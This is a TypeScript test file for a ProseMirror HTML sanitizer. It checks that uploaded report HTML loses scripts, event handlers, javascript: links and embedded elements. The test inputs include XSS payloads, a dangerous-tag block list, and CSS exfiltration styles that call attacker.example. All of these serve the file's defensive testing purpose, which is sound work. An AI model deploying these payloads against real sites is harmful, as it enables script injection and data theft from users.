// SECURITY (PR #151 review, Fix 1 + Fix 2): the report-html schema is the
// enforcing allowlist between untrusted, uploaded report HTML and the
// ProseMirror doc rendered on the trusted app.<domain> origin (ADR-0062 §9).
// ProseMirror's own DOM rendering escapes text content, but any ATTRIBUTE the
// schema chooses to retain passes straight through `toDOM` into real DOM
// attributes — so an `on*` handler or a `javascript:`/`url(...)`-bearing
// value that survives `parseBody` is a live XSS / CSS-exfiltration primitive
// once rendered back out via `serializeBody`. These tests parse a battery of
// hostile fragments and assert nothing dangerous survives, at three layers:
// the doc JSON's node types, every attrs object reachable in that JSON (walked
// recursively), and the final serialized HTML string.
import { describe, expect, it } from "vitest";
import { parseBody, serializeBody } from "./body.js";

const DANGEROUS_TAGS = ["script", "iframe", "object", "embed", "form"] as const;

/** Recursively visit every `attrs` object reachable in a PMDocJson tree (node
 *  attrs and mark attrs alike — marks are `{ type, attrs }` objects nested
 *  inside a node's `marks` array, same shape as a node's own `attrs`). */
function walkAttrs(value: unknown, visit: (attrs: Record<string, unknown>) => void): void {
  if (!value || typeof value !== "object") return;
  if (Array.isArray(value)) {
    for (const item of value) walkAttrs(item, visit);
    return;
  }
  const obj = value as Record<string, unknown>;
  if (obj.attrs && typeof obj.attrs === "object") {
    visit(obj.attrs as Record<string, unknown>);
  }
  for (const [key, val] of Object.entries(obj)) {
    if (key === "attrs") continue;
    walkAttrs(val, visit);
  }
}

/** Collect every node `type` string reachable in a PMDocJson tree. */
function collectNodeTypes(value: unknown, into: Set<string>): void {
  if (!value || typeof value !== "object") return;
  if (Array.isArray(value)) {
    for (const item of value) collectNodeTypes(item, into);
    return;
  }
  const obj = value as Record<string, unknown>;
  if (typeof obj.type === "string") into.add(obj.type);
  for (const [key, val] of Object.entries(obj)) {
    if (key === "type") continue;
    collectNodeTypes(val, into);
  }
}

function assertNoActiveContent(html: string) {
  const doc = parseBody(html);

  // 1. No dangerous node type, and no generic-block `tag` attr naming one of
  //    the dangerous tags (the htmlBlock catch-all only whitelists
  //    div/aside/header/footer/nav/main, but assert it explicitly so this
  //    stays true if that whitelist is ever widened carelessly).
  const types = new Set<string>();
  collectNodeTypes(doc, types);
  for (const tag of DANGEROUS_TAGS) {
    expect(types.has(tag), `doc JSON must not contain a "${tag}" node type`).toBe(false);
  }

  // 2. No attrs object anywhere carries an `on*` handler, a `javascript:`
  //    href, or a dangerous `tag` attr.
  walkAttrs(doc, (attrs) => {
    for (const key of Object.keys(attrs)) {
      expect(
        /^on/i.test(key),
        `attrs must not retain an event-handler key: "${key}" = ${JSON.stringify(attrs[key])}`,
      ).toBe(false);
    }
    if (typeof attrs.href === "string") {
      expect(
        attrs.href.trim().toLowerCase().startsWith("javascript:"),
        `href must not be a javascript: URL: ${attrs.href}`,
      ).toBe(false);
    }
    if (typeof attrs.tag === "string") {
      expect(
        (DANGEROUS_TAGS as readonly string[]).includes(attrs.tag.toLowerCase()),
        `attrs.tag must not name a dangerous element: ${attrs.tag}`,
      ).toBe(false);
    }
  });

  // 3. The serialized HTML string — what actually gets written back to the
  //    version's HTML blob and re-parsed by a browser — carries none of it
  //    either. Belt-and-braces on top of (1)/(2): this is the layer that
  //    actually reaches the DOM.
  const serialized = serializeBody(doc);
  for (const tag of DANGEROUS_TAGS) {
    expect(serialized.toLowerCase(), `serialized output must not contain <${tag}`).not.toContain(
      `<${tag}`,
    );
  }
  expect(serialized.toLowerCase()).not.toMatch(/\son[a-z]+\s*=/);
  expect(serialized.toLowerCase()).not.toContain("javascript:");
}

describe("SECURITY: hostile fragments never survive parseBody/serializeBody", () => {
  it("strips <script>alert(1)</script>", () => {
    assertNoActiveContent("<p>before</p><script>alert(1)</script><p>after</p>");
  });

  it("strips onclick/onmouseover handlers on a <p>", () => {
    assertNoActiveContent('<p onclick="x()" onmouseover="y()">t</p>');
  });

  it("strips onerror on an <img>", () => {
    assertNoActiveContent('<p><img src="x" onerror="z()"></p>');
  });

  it("strips <iframe>", () => {
    assertNoActiveContent('<p>before</p><iframe src="https://evil.example"></iframe><p>after</p>');
  });

  it("strips <object>", () => {
    assertNoActiveContent('<p>before</p><object data="https://evil.example"></object><p>after</p>');
  });

  it("strips <embed>", () => {
    assertNoActiveContent('<p>before</p><embed src="https://evil.example"><p>after</p>');
  });

  it("strips <form>", () => {
    assertNoActiveContent(
      '<form action="https://evil.example"><input name="x"></form><p>after</p>',
    );
  });

  it("strips a javascript: href on <a>", () => {
    assertNoActiveContent('<p><a href="javascript:alert(1)">click me</a></p>');
  });

  it("strips a data:text/html href on <a>", () => {
    assertNoActiveContent('<p><a href="data:text/html,<script>alert(1)</script>">click me</a></p>');
  });

  it("strips every hostile fragment at once, combined", () => {
    assertNoActiveContent(
      "<p>before</p>" +
        "<script>alert(1)</script>" +
        '<p onclick="x()" onmouseover="y()">t</p>' +
        '<img src="x" onerror="z()">' +
        '<iframe src="https://evil.example"></iframe>' +
        '<object data="https://evil.example"></object>' +
        '<embed src="https://evil.example">' +
        '<form action="https://evil.example"><input name="x"></form>' +
        '<p><a href="javascript:alert(1)">click me</a></p>' +
        "<p>after</p>",
    );
  });
});

describe("SECURITY (Fix 2): retained style attribute values are sanitized against CSS exfiltration", () => {
  it("drops a background:url(...) declaration but keeps a sibling color:var(...) declaration", () => {
    const html = '<p style="background:url(https://attacker.example/leak); color:var(--now)">t</p>';
    const roundtripped = serializeBody(parseBody(html));
    expect(roundtripped).not.toContain("url(");
    expect(roundtripped).not.toContain("attacker.example");
    expect(roundtripped).toContain("var(--now)");
  });

  it("drops image-set(...) and expression(...) declarations, keeps siblings", () => {
    const html =
      '<p style="background-image:image-set(url(https://attacker.example/x) 1x); ' +
      'width:expression(alert(1)); color:var(--now)">t</p>';
    const roundtripped = serializeBody(parseBody(html));
    expect(roundtripped).not.toContain("image-set(");
    expect(roundtripped).not.toContain("expression(");
    expect(roundtripped).not.toContain("attacker.example");
    expect(roundtripped).toContain("var(--now)");
  });

  it("drops an @import statement embedded in a style value", () => {
    const html =
      '<p style="@import url(https://attacker.example/evil.css); color:var(--now)">t</p>';
    const roundtripped = serializeBody(parseBody(html));
    expect(roundtripped).not.toContain("@import");
    expect(roundtripped).not.toContain("attacker.example");
    expect(roundtripped).toContain("var(--now)");
  });

  it("sanitizes a style retained via the generic block catch-all (div/aside/header/footer/nav/main)", () => {
    const html =
      '<div style="background:url(https://attacker.example/leak); color:var(--now)"><p>x</p></div>';
    const roundtripped = serializeBody(parseBody(html));
    expect(roundtripped).not.toContain("url(");
    expect(roundtripped).toContain("var(--now)");
  });

  it("sanitizes a style retained via the generic inline <span> catch-all", () => {
    const html =
      '<p><span style="background:url(https://attacker.example/leak); color:var(--now)">x</span></p>';
    const roundtripped = serializeBody(parseBody(html));
    expect(roundtripped).not.toContain("url(");
    expect(roundtripped).toContain("var(--now)");
  });

  it("sanitizes a style retained on a <th>/<td> table cell", () => {
    const html =
      '<div class="tablewrap"><table><thead><tr>' +
      '<th style="background:url(https://attacker.example/leak); width:22%">H</th>' +
      "</tr></thead><tbody><tr>" +
      '<td style="background:url(https://attacker.example/leak); color:var(--now)">c</td>' +
      "</tr></tbody></table></div>";
    const roundtripped = serializeBody(parseBody(html));
    expect(roundtripped).not.toContain("url(");
    expect(roundtripped).not.toContain("attacker.example");
    expect(roundtripped).toContain("var(--now)");
  });
});
